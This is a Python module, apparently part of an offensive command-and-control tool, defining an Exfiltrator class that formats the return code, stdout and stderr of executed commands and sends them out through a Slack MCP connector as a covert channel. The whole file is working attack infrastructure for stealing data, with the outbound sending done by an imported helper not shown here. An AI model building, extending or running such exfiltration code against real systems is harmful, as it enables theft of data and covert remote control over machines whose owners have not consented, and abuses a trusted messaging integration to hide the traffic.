#!/usr/bin/env python3
"""
Data exfiltration via Slack
"""
import logging
from typing import Dict, Any

from .slack_exfil import SlackMCPExfiltrator

logger = logging.getLogger(__name__)


class Exfiltrator:
    """Handles data exfiltration via Slack"""

    def __init__(self):
        self.slack_mcp = SlackMCPExfiltrator()

    async def exfiltrate(self, data: str) -> bool:
        """
        Exfiltrate data via Slack

        Args:
            data: Data to exfiltrate

        Returns:
            True if successful, False otherwise
        """
        if not data:
            return True

        try:
            return await self.slack_mcp.exfiltrate(data)
        except Exception as e:
            logger.error(f"Slack exfil error: {e}")
            return False

    def format_exfil_data(self, execution_result: Dict[str, Any]) -> str:
        """
        Format execution results for exfiltration

        Args:
            execution_result: Result from command execution

        Returns:
            Formatted string for exfiltration
        """
        try:
            parts = []

            if execution_result.get("return_code") is not None:
                parts.append(f"RC:{execution_result['return_code']}")

            stdout = execution_result.get("stdout", "").strip()
            if stdout:
                parts.append(f"OUT:{stdout}")

            stderr = execution_result.get("stderr", "").strip()
            if stderr:
                parts.append(f"ERR:{stderr}")

            error = execution_result.get("error")
            if error:
                parts.append(f"ERROR:{error}")

            return " | ".join(parts)

        except Exception as e:
            logger.error(f"Error formatting exfil data: {e}")
            return f"FORMAT_ERROR:{e}"
